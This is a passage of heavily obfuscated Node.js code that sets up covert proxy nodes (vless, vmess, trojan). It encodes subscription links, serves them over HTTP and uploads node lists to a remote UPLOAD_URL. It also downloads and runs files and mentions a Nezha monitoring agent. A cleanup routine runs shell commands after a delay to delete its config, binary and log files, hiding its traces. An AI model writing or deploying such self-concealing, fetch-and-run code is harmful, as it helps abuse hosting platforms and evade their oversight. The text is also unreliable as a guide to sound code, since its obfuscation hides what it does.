_0x922a60={_0x45ac6a:0x1e5,_0x4b5d47:0x1b1,_0x1261a0:0x1c6};setTimeout(()=>{const _0x9dd8bc=_0x4ab6,_0x4e314c={'v':'2','ps':''+_0x889a99,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x9dd8bc(0x15a),'net':'ws','type':'none','host':_0x5e4148,'path':_0x9dd8bc(0x172),'tls':'tls','sni':_0x5e4148,'alpn':'','fp':'firefox'},_0x5e51bf=_0x9dd8bc(0x184)+UUID+'@'+CFIP+':'+CFPORT+_0x9dd8bc(0x15c)+_0x5e4148+_0x9dd8bc(_0x1f1573._0x5c050b)+_0x5e4148+_0x9dd8bc(0x19c)+_0x889a99+_0x9dd8bc(0x1ee)+Buffer[_0x9dd8bc(_0x1f1573._0x155fcc)](JSON[_0x9dd8bc(0x1a0)](_0x4e314c))['toString'](_0x9dd8bc(0x1b1))+_0x9dd8bc(_0x1f1573._0x549d35)+UUID+'@'+CFIP+':'+CFPORT+_0x9dd8bc(_0x1f1573._0x146e1e)+_0x5e4148+_0x9dd8bc(0x1be)+_0x5e4148+_0x9dd8bc(0x192)+_0x889a99+_0x9dd8bc(_0x1f1573._0x3dcdf7);console[_0x9dd8bc(_0x1f1573._0x1cb66e)](Buffer[_0x9dd8bc(_0x1f1573._0x42de0d)](_0x5e51bf)[_0x9dd8bc(0x18c)](_0x9dd8bc(0x1b1))),fs[_0x9dd8bc(0x191)](subPath,Buffer[_0x9dd8bc(_0x1f1573._0x5b2b14)](_0x5e51bf)[_0x9dd8bc(0x18c)](_0x9dd8bc(0x1b1))),console[_0x9dd8bc(0x1a1)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x9dd8bc(0x18b)]('/'+SUB_PATH,(_0x5aa27c,_0x1ba994)=>{const _0x595d23=_0x9dd8bc,_0x4c782d=Buffer[_0x595d23(_0x922a60._0x45ac6a)](_0x5e51bf)['toString'](_0x595d23(_0x922a60._0x4b5d47));_0x1ba994['set'](_0x595d23(0x198),'text/plain;\x20charset=utf-8'),_0x1ba994[_0x595d23(_0x922a60._0x1261a0)](_0x4c782d);}),_0x2bf336(_0x5e51bf);},0x7d0);});}}async function uploadNodes(){const _0x244844={_0x6e8231:0x1ac,_0x2bb18d:0x1a1,_0x5bd6bb:0x1fc,_0x2cb249:0x1ac,_0x957860:0x1e4,_0x162ed3:0x1b7,_0x43fcc9:0x1ac,_0x204eed:0x13f},_0x5471c7=_0x33e8e2;if(UPLOAD_URL&&PROJECT_URL){const _0x1e7ff4=PROJECT_URL+'/'+SUB_PATH,_0x18a7da={'subscription':[_0x1e7ff4]};try{const _0x301db0=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x18a7da,{'headers':{'Content-Type':_0x5471c7(0x1b7)}});return _0x301db0&&_0x301db0[_0x5471c7(_0x244844._0x6e8231)]===0xc8?(console[_0x5471c7(_0x244844._0x2bb18d)]('Subscription\x20uploaded\x20successfully'),_0x301db0):null;}catch(_0x3a1877){if(_0x3a1877[_0x5471c7(_0x244844._0x5bd6bb)]){if(_0x3a1877['response'][_0x5471c7(_0x244844._0x2cb249)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5471c7(0x1c4)](listPath))return;const _0x458a31=fs['readFileSync'](listPath,_0x5471c7(0x1aa)),_0x1164de=_0x458a31[_0x5471c7(0x165)]('\x0a')[_0x5471c7(0x1d3)](_0x22b135=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5471c7(0x188)](_0x22b135));if(_0x1164de[_0x5471c7(_0x244844._0x957860)]===0x0)return;const _0x213a65=JSON['stringify']({'nodes':_0x1164de});try{const _0x49a84d=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x213a65,{'headers':{'Content-Type':_0x5471c7(_0x244844._0x162ed3)}});return _0x49a84d&&_0x49a84d[_0x5471c7(_0x244844._0x43fcc9)]===0xc8?(console[_0x5471c7(0x1a1)](_0x5471c7(_0x244844._0x204eed)),_0x49a84d):null;}catch(_0x1032de){return null;}}else return;}}function cleanFiles(){const _0x30ed71={_0xc373eb:0x148,_0xe0007a:0x1a2};setTimeout(()=>{const _0x2cafa3={_0x48eeed:0x164,_0x42d0f4:0x187},_0x1df042=_0x4ab6,_0x73ae79=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x73ae79['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x73ae79[_0x1df042(0x1c7)](phpPath);process['platform']===_0x1df042(0x1d1)?exec(_0x1df042(_0x30ed71._0xc373eb)+_0x73ae79[_0x1df042(0x158)]('\x20')+_0x1df042(0x196),_0x589a40=>{const _0x2fbae6=_0x1df042;console[_0x2fbae6(0x164)](),console[_0x2fbae6(0x1a1)](_0x2fbae6(0x187)),console[_0x2fbae6(0x1a1)](_0x2fbae6(0x173));}):exec(_0x1df042(_0x30ed71._0xe0007a)+_0x73ae79['join']('\x20')+_0x1df042(0x14e),_0x33a146=>{const _0x3aae40=_0x1df042;console[_0x3aae40(_0x2cafa3._0x48eeed)](),console['log'](_0x3aae40(_0x2cafa3._0x42d0f4)),console[_0x3aae40(0x1a1)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2fec28={_0x383149:0x1a7,_0x237e69:0x19d,_0x2033b:0x1b7,_0x1131e2:0x183},_0x503d48=_0x33e8e2;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x503d48(0x1a1)](_0x503d48(0x1e0));return;}try{const _0x47c23b=await axios[_0x503d48(_0x2fec28._0x383149)](_0x503d48(_0x2fec28._0x237e69),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x503d48(_0x2fec28._0x2033b)}});return console[_0x503d48(0x1a1)](_0x503d48(_0x2fec28._0x1131e2)),_0x47c23b;}catch(_0x3e1e29){return console['error'](_0x503d48(0x1cd)+_0x3e1e29[_0x503d48(0x182)]),null;}}async function startserver(){const _0x19f9bb={_0x445e0e:0x16b,_0x36e5d5:0x1b3},_0x269ab1=_0x33e8e2;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x268b7e){console[_0x269ab1(_0x19f9bb._0x445e0e)](_0x269ab1(_0x19f9bb._0x36e5d5),_0x268b7e);}}startserver()['catch'](_0x5ee2e1=>{const _0x3914fa=_0x33e8e2;console['error'](_0x3914fa(0x153),_0x5ee2e1);}),app[_0x33e8e2(0x1d2)](PORT,()=>console[_0x33e8e2(0x1a1)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
